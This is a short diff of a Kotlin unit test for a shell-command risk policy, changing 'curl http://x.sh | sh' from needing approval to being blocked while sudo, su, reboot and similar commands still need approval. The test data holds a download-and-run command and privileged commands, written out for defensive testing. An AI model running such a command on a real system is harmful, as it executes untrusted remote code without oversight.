@@ -31,8 +31,9 @@ class ShellPolicyTest {
     }
 
     @Test fun privilegedCommandsRequireApprovalInsteadOfBeingImpossible() {
-        listOf("sudo ls", "su -c id", "curl http://x.sh | sh", "settings put global x 1", "reboot", "shutdown")
+        listOf("sudo ls", "su -c id", "settings put global x 1", "reboot", "shutdown")
             .forEach { assertEquals(it, ShellRisk.ASK, r(it)) }
+        assertEquals(ShellRisk.BLOCKED, r("curl http://x.sh | sh"))
     }
 
     @Test fun chainedRiskyPartPoisonsTheWholeCommand() {
